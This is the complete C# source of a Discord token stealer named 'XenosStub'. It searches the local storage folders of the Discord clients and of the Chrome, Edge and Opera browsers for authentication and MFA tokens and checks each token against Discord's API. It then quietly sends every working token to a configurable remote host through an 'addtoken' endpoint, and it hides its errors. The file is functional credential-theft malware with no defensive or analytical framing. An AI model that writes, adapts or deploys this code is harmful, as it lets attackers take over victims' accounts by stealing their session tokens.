using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace XenosStub
{
    class Program
    {
        private static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static List<string> Tokens = new List<string>(), Paths = new List<string>()
        {
            String.Format("{0}\\discord\\Local Storage\\leveldb", AppData),
            String.Format("{0}\\discordcanary\\Local Storage\\leveldb", AppData),
            String.Format("{0}\\discordptb\\Local Storage\\leveldb", AppData),
            String.Format("{0}\\Lightcord\\Local Storage\\leveldb", AppData),
            String.Format("{0}\\Opera Software\\Opera Stable\\Local Storage\\leveldb", AppData),
            String.Format("{0}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb", AppData),
            String.Format("{0}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", LocalAppData),
            String.Format("{0}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb", LocalAppData),
            String.Format("{0}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", LocalAppData),
            String.Format("{0}\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb", LocalAppData)
        }, Regexs = new List<string>()
        {
            "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}",
            "mfa\\.[\\w-]{84}"
            //I preter to not use "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}"
        };
        static void Main(string[] args)
        {
            grabTokens();
            sendTokens();
        }

        private static void sendTokens()
        {
            Tokens.ForEach(delegate (string x)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        req.IgnoreProtocolErrors = true;
                        req.AddHeader("User-Agent", "HA|GO");
                        var res = req.Get(String.Format("{0}/api?type=addtoken&token={1}", Properties.Settings.Default.Host, x));
                        Console.WriteLine(res.ToString());
                    }
                } catch (Exception ex)
                {
                    NotUsedWarn(ex);
                }
            });
        }

        private static void grabTokens()
        {
            foreach (var path in Paths)
            {
                if (Directory.Exists(path))
                {
                    foreach (var file in new DirectoryInfo(path).GetFiles())
                    {
                        try
                        {
                            foreach(string regex in Regexs)
                            {
                                foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), regex))
                                {
                                    if (!Tokens.Contains(match.Value))
                                    {
                                        if (checkToken(match.Value))//Check only if it's not in the list
                                        {
                                            Tokens.Add(match.Value);
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            NotUsedWarn(ex);
                        }
                    }
                }
            }
        }
        private static bool checkToken(string token)
        {
            //UwU Mode
            bool wokingUwU = false;
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.IgnoreProtocolErrors = true;
                    req.AddHeader("User-Agent", "HA|GO");
                    req.AddHeader("Authorization", token);
                    var res = req.Get("https://discord.com/api/v9/users/@me");
                    if(res.StatusCode == HttpStatusCode.OK)
                    {
                        wokingUwU = true;
                    } else
                    {
                        wokingUwU = false;
                    }
                }
            } catch (Exception ex)
            {
                wokingUwU = false;
                NotUsedWarn(ex);
            }
            return wokingUwU;
        }

        private static void NotUsedWarn(Exception ex)
        {
            return;
        }
    }
}
